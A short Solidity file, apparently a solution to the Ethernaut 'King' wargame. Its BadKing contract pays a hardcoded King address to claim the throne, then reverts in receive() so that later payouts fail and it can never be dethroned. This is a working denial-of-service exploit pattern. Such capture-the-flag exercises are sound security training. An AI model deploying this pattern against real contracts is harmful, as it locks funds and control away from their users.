// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {receive() external payable {}}

contract BadKing {
    address payable addr = payable(0x91B19163b5db1970DCF57Fba054128a6c565F5a5);
    
    // Create a malicious contract and seed it with some Ethers
    function loadContract() public payable {
    }
    
    // This should trigger King fallback(), making this contract the king
    function becomeKing() payable public {
        (bool success, ) = payable(address(addr)).call{value: msg.value}("");
        require(success, "External call failed");
    }
    
    // This function fails "king.transfer" trx from Ethernaut
    receive() external payable {
        revert("haha you fail");
    }
}